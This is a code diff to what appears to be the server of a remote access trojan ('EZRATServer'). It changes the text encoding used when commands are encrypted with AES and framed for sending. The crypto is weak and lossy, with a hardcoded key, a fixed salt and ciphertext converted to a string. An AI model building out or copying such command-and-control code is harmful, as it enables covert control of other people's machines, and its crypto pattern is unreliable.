@@ -432,7 +432,7 @@ namespace EZRATServer
         public string Encrypt(string clearText)
         {
             string EncryptionKey = EncryptKey; //Declare the encryption key (it's not the best thing to do)
-            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText); //Get the bytes of the message
+            byte[] clearBytes = Encoding.Default.GetBytes(clearText); //Get the bytes of the message
             using (Aes encryptor = Aes.Create()) //Create a new aes object
             {
                 Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 }); //Get encryption key
@@ -472,7 +472,7 @@ namespace EZRATServer
                             cs.Write(cipherBytes, 0, cipherBytes.Length); //Write the encrypted data to the crypto stream
                             cs.Close(); //Close the crypto stream
                         }
-                        cipherText = Encoding.Unicode.GetString(ms.ToArray()); //Convert the memory stream to string
+                        cipherText = Encoding.Default.GetString(ms.ToArray()); //Convert the memory stream to string
                     }
                 }
 
@@ -499,9 +499,9 @@ namespace EZRATServer
                 try
                 {
                     command = Encrypt(command); //Encrypt the comand
-                    byte[] data = Encoding.Unicode.GetBytes(command); //Get the unicode bytes of the comand
+                    byte[] data = Encoding.Default.GetBytes(command); //Get the unicode bytes of the comand
                     string header = command.Length.ToString() + "§"; //Create message length header
-                    byte[] byteHeader = Encoding.Unicode.GetBytes(header); //Convert the header to bytes
+                    byte[] byteHeader = Encoding.Default.GetBytes(header); //Convert the header to bytes
                     byte[] fullBytes = new byte[byteHeader.Length + data.Length]; //Allocate space for the full message
                     Array.Copy(byteHeader, fullBytes, byteHeader.Length); //Copy the message hader to the full message
                     Array.ConstrainedCopy(data, 0, fullBytes, byteHeader.Length, data.Length); //Copy the message to the full message
